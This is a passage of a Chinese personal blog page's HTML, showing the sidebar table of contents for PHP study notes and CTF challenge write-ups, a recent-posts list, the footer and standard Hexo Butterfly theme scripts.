href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.0.0.4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.0.0.4.1.</span> <span class="toc-text">PHP代码的执行流程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.0.0.4.2.</span> <span class="toc-text">加载原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E8%B7%AF%E5%BE%84"><span class="toc-number">1.0.0.0.4.3.</span> <span class="toc-text">文件加载路径</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A9"><span class="toc-number">2.</span> <span class="toc-text">第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.0.0.0.2.</span> <span class="toc-text">伪类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.0.0.3.</span> <span class="toc-text">常用系统函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.0.0.0.4.</span> <span class="toc-text">字符串</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A9"><span class="toc-number">3.</span> <span class="toc-text">第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A8%E5%8D%95%E4%BC%A0%E5%80%BC"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text">表单传值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text">文件上传</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%A4%A9"><span class="toc-number">4.</span> <span class="toc-text">第四天</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%A8%A1%E6%8B%9FHTTP%E8%AF%B7%E6%B1%82"><span class="toc-number">4.1.</span> <span class="toc-text">PHP模拟HTTP请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Curl%E6%89%A9%E5%B1%95%E5%BA%93%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.2.</span> <span class="toc-text">Curl扩展库使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">4.2.</span> <span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.1.</span> <span class="toc-text">PHP5常见文件操作函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP4%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.2.</span> <span class="toc-text">PHP4常见文件操作函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.3.</span> <span class="toc-text">其他文件操作函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-1"><span class="toc-number">4.3.</span> <span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.3.1.</span> <span class="toc-text">文件下载</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">5.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">6.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">7.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网学习"/></a><div class="content"><a class="title" href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" title="内网学习">内网学习</a><time datetime="2023-02-21T05:57:41.000Z" title="Created 2023-02-21 13:57:41">2023-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Webshell工具学习"/></a><div class="content"><a class="title" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习">Webshell工具学习</a><time datetime="2023-01-21T05:30:21.000Z" title="Created 2023-01-21 13:30:21">2023-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022NOV月赛"/></a><div class="content"><a class="title" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛">DASCTF2022NOV月赛</a><time datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img src="/imgg/3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安洵杯2022"/></a><div class="content"><a class="title" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022">安洵杯2022</a><time datetime="2022-11-28T08:59:18.000Z" title="Created 2022-11-28 16:59:18">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img src="/imgg/2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GeekChallenge2022"/></a><div class="content"><a class="title" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022">GeekChallenge2022</a><time datetime="2022-11-26T12:22:29.000Z" title="Created 2022-11-26 20:22:29">2022-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>